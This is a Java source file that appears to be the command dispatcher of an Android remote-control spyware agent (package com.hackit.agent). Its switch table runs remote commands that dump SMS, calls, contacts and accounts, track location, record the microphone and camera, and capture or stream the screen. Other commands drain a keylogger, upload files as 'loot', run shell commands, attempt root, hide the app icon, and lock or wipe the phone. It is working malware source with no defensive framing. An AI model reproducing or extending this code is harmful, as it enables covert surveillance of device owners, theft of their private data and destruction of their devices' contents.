package com.hackit.agent;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.List;

/**
 * Command table. One method per verb, every return normalised to
 * {@code {"code":0|1,"out":...}}. Handlers run on the pool and may block; the
 * beacon never waits on them.
 */
final class Dispatcher {
    private static final JSONArray LOOT = new JSONArray();

    static void prime(Context ctx) {
        if (Modules.on(ctx, "sms")) {
            SmsStore.watch(ctx);
        }
        if (Modules.on(ctx, "calls")) {
            CallStore.watch(ctx);
        }
        if (Modules.on(ctx, "loc") && (Common.granted(ctx, android.Manifest.permission.ACCESS_FINE_LOCATION)
                || Common.granted(ctx, android.Manifest.permission.ACCESS_COARSE_LOCATION))) {
            LocMon.start(ctx, false);
        }
    }

    static JSONArray drainLoot() {
        synchronized (LOOT) {
            JSONArray copy = new JSONArray();
            for (int i = 0; i < LOOT.length(); i++) {
                copy.put(LOOT.opt(i));
            }
            Common.clear(LOOT);
            return copy;
        }
    }

    static JSONObject run(Context ctx, JSONObject task) {
        String cmd = task.optString("cmd", "");
        JSONArray args = task.optJSONArray("args");
        String first = args != null && args.length() > 0 ? args.optString(0) : "";
        String second = args != null && args.length() > 1 ? args.optString(1) : "";
        if (!Modules.on(ctx, moduleFor(cmd)) && !CORE.contains(cmd)) {
            return fail(cmd + " disabled by spec");
        }
        try {
            switch (cmd) {
                case "ping":
                    return ok("pong " + System.currentTimeMillis());
                case "info":
                    return ok(Info.snapshot(ctx));
                case "perm_status":
                    return ok(perms(ctx));
                case "lock":
                    return ok(lock(ctx));
                case "wipe":
                    return ok(wipe(ctx));
                case "takeover":
                    // Re-assert the on-device side of the takeover: watchers,
                    // collectors, root grants and the wake-up chain, then report.
                    prime(ctx);
                    Scheduler.arm(ctx);
                    BeaconService.start(ctx);
                    String root = Root.bypass(ctx);
                    JSONObject state = perms(ctx);
                    state.put("root", root);
                    return ok(state);
                case "sms_dump":
                    return ok(SmsStore.dump(ctx, parseInt(first, 200)));
                case "sms_send":
                    return okOr(SmsStore.send(ctx, first, second), "sent", "send failed");
                case "calls_dump":
                    return ok(CallStore.dump(ctx, parseInt(first, 200)));
                case "contacts_dump":
                    return ok(ContactsStore.dump(ctx, parseInt(first, 1000)));
                case "loc":
                    LocMon.start(ctx, false);
                    return ok("fix requested");
                case "loc_track":
                    if ("off".equals(first)) {
                        LocMon.stop();
                        return ok("tracking off");
                    }
                    LocMon.start(ctx, true);
                    return ok("tracking on");
                case "files_ls":
                    return ok(Files.list(ctx, first));
                case "files_pull":
                    return pull(ctx, first);
                case "files_push":
                    return ok(Files.push(ctx, first, second));
                case "clipboard_get":
                    return ok(ClipMon.read(ctx));
                case "clipboard_set":
                    return okOr(ClipMon.write(ctx, first), "clipboard set", "write failed");
                case "notif_dump":
                    return ok(NotifyMon.connected() ? "listener active" : "listener not enabled");
                case "apps":
                    return ok(Apps.dump(ctx));
                case "mic_rec":
                    return ok(MediaMon.record(ctx, parseInt(first, 15)));
                case "cam_shot":
                    return ok(MediaMon.photo(ctx));
                case "screenshot":
                    return ok(ScreenCap.capture(ctx));
                case "shell":
                    return ok(Shell.run(first));
                case "keylog_dump":
                    return ok(KeyMon.drain(400));
                case "keylog_clear":
                    KeyMon.clear();
                    return ok("cleared");
                case "toast":
                    toast(ctx, first);
                    return ok("toast shown");
                case "vibrate":
                    return ok(vibrate(ctx, parseInt(first, 600)) ? "vibrated" : "no vibrator");
                case "open_url":
                    return ok(openUrl(ctx, first));
                case "wifi_dump":
                    return ok(WifiMon.dump(ctx));
                case "accounts":
                    return ok(Accounts.dump(ctx));
                case "usage":
                    return ok(UsageMon.dump(ctx, parseInt(first, 7)));
                case "screen_start":
                    return ok(ScreenStream.start(ctx));
                case "screen_stop":
                    return ok(ScreenStream.stop());
                case "spec":
                    return ok(Modules.spec(ctx));
                case "modules":
                    return ok(Config.get(ctx).modules);
                case "native_state":
                    return ok(NativeBridge.state());
                case "native_probe":
                    return ok(NativeBridge.probe(first));
                case "watch_start":
                    return okOr(NativeBridge.available() && NativeBridge.nativeWatch(first),
                            "watch armed", "watch unavailable");
                case "watch_add":
                    return okOr(NativeBridge.available() && NativeBridge.nativeWatchAdd(first),
                            "watch added", "watch unavailable");
                case "watch_drain":
                    return ok(NativeBridge.available() ? NativeBridge.nativeWatchDrain() : "[]");
                case "hide_icon":
                    Launcher.setEnabled(ctx, !"off".equals(first));
                    return ok(Launcher.enabled(ctx) ? "icon visible" : "icon hidden");
                default:
                    return fail("unknown command " + cmd);
            }
        } catch (Throwable exc) {
            Log.e("dispatch " + cmd + ": " + exc);
            return fail(cmd + " failed: " + exc);
        }
    }

    private static final List<String> CORE = java.util.Arrays.asList(
            "ping", "info", "perm_status", "spec", "modules", "hide_icon", "toast", "vibrate",
            "open_url", "takeover", "lock", "wipe");

    private static String moduleFor(String cmd) {
        switch (cmd) {
            case "sms_dump": case "sms_send": return "sms";
            case "calls_dump": return "calls";
            case "contacts_dump": case "accounts": return "contacts";
            case "loc": case "loc_track": return "loc";
            case "files_ls": case "files_pull": case "files_push": return "files";
            case "clipboard_get": case "clipboard_set": return "clip";
            case "notif_dump": return "notif";
            case "mic_rec": return "mic";
            case "cam_shot": return "cam";
            case "screenshot": case "screen_start": case "screen_stop": return "screen";
            case "shell": return "shell";
            case "keylog_dump": case "keylog_clear": return "keylog";
            case "wifi_dump": return "wifi";
            case "usage": return "usage";
            case "apps": return "apps";
            case "native_state": case "native_probe": case "watch_start":
            case "watch_add": case "watch_drain": return "native";
            default: return "other";
        }
    }

    private static JSONObject pull(Context ctx, String path) {
        if (path.isEmpty()) {
            return fail("usage: files_pull <path>");
        }
        if (!Files.pull(ctx, path)) {
            return fail("pull failed: " + path);
        }
        JSONObject row = new JSONObject();
        try {
            row.put("name", new java.io.File(path).getName());
            row.put("kind", "file");
            row.put("size", new java.io.File(path).length());
        } catch (Exception ignored) {
        }
        synchronized (LOOT) {
            LOOT.put(row);
            while (LOOT.length() > 32) {
                LOOT.remove(0);
            }
        }
        return ok("uploaded " + path);
    }

    private static String lock(Context ctx) {
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager)
                    ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (dpm == null || !dpm.isAdminActive(new android.content.ComponentName(ctx, AdminReceiver.class))) {
                return "device admin not enabled";
            }
            dpm.lockNow();
            return "locked";
        } catch (Throwable exc) {
            return "lock failed: " + exc;
        }
    }

    private static String wipe(Context ctx) {
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager)
                    ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (dpm == null || !dpm.isAdminActive(new android.content.ComponentName(ctx, AdminReceiver.class))) {
                return "device admin not enabled";
            }
            dpm.wipeData(0);
            return "factory reset started";
        } catch (Throwable exc) {
            return "wipe failed: " + exc;
        }
    }

    private static JSONObject perms(Context ctx) {
        JSONObject out = new JSONObject();
        String[] names = {
                "READ_SMS", "SEND_SMS", "READ_CALL_LOG", "READ_CONTACTS", "READ_PHONE_STATE",
                "ACCESS_FINE_LOCATION", "ACCESS_COARSE_LOCATION", "ACCESS_BACKGROUND_LOCATION",
                "RECORD_AUDIO", "CAMERA", "READ_EXTERNAL_STORAGE", "POST_NOTIFICATIONS", "GET_ACCOUNTS",
        };
        try {
            for (String name : names) {
                String full = "android.permission." + name;
                out.put(name, Common.granted(ctx, full));
            }
            out.put("MANAGE_EXTERNAL_STORAGE", Build.VERSION.SDK_INT < 30 || Info.admin(ctx)
                    || android.os.Environment.isExternalStorageManager());
            out.put("accessibility", KeyMon.connected());
            out.put("notification_listener", NotifyMon.connected());
            out.put("device_admin", Info.admin(ctx));
            out.put("ignore_battery", Info.ignoreBattery(ctx));
            out.put("projection", ScreenCap.live());
        } catch (Throwable exc) {
            Log.d("perms: " + exc);
        }
        return out;
    }

    private static void toast(final Context ctx, final String message) {
        final String text = message.isEmpty() ? "System service" : message;
        MediaMon.mainHandler().post(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(ctx.getApplicationContext(), text, Toast.LENGTH_SHORT).show();
            }
        });
    }

    @SuppressWarnings("deprecation")
    private static boolean vibrate(Context ctx, int ms) {
        try {
            Vibrator vibrator = (Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
            if (vibrator == null || !vibrator.hasVibrator()) {
                return false;
            }
            int duration = Math.max(50, Math.min(ms, 5000));
            if (Build.VERSION.SDK_INT >= 26) {
                vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                vibrator.vibrate(duration);
            }
            return true;
        } catch (Throwable exc) {
            return false;
        }
    }

    private static String openUrl(Context ctx, String url) {
        if (url.isEmpty()) {
            return "usage: open_url <url>";
        }
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
            return "opened " + url;
        } catch (Throwable exc) {
            return "open failed: " + exc;
        }
    }

    private static int parseInt(String value, int fallback) {
        try {
            return Integer.parseInt(value.trim());
        } catch (Throwable exc) {
            return fallback;
        }
    }

    private static JSONObject ok(Object out) {
        JSONObject reply = new JSONObject();
        try {
            reply.put("code", 0);
            reply.put("out", out == null ? "" : out);
        } catch (Exception ignored) {
        }
        return reply;
    }

    private static JSONObject okOr(boolean condition, String yes, String no) {
        return ok(condition ? yes : no);
    }

    private static JSONObject fail(String message) {
        JSONObject reply = new JSONObject();
        try {
            reply.put("code", 1);
            reply.put("out", message);
        } catch (Exception ignored) {
        }
        return reply;
    }

    private Dispatcher() {
    }
}
